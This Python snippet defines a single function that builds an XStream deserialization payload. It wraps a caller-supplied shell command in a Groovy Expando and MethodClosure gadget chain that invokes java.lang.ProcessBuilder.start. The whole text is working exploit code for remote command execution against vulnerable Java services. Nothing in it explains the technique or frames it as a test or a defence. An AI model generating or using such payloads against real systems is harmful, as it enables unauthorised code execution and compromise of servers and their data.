def prepare_payload(command):
    splitCommand = command.split()
    preparedCommands = ''

    for entry in splitCommand:
        preparedCommands += f'<string>{entry}</string>'

    xml = f'''
        <map>
          <entry>
            <groovy.util.Expando>
              <expandoProperties>
                <entry>
                  <string>hashCode</string>
                  <org.codehaus.groovy.runtime.MethodClosure>
                    <delegate class="groovy.util.Expando"/>
                    <owner class="java.lang.ProcessBuilder">
                      <command>{preparedCommands}</command>
                    </owner>
                    <method>start</method>
                  </org.codehaus.groovy.runtime.MethodClosure>
                </entry>
              </expandoProperties>
            </groovy.util.Expando>
            <int>1</int>
          </entry>
        </map>'''

    return xml
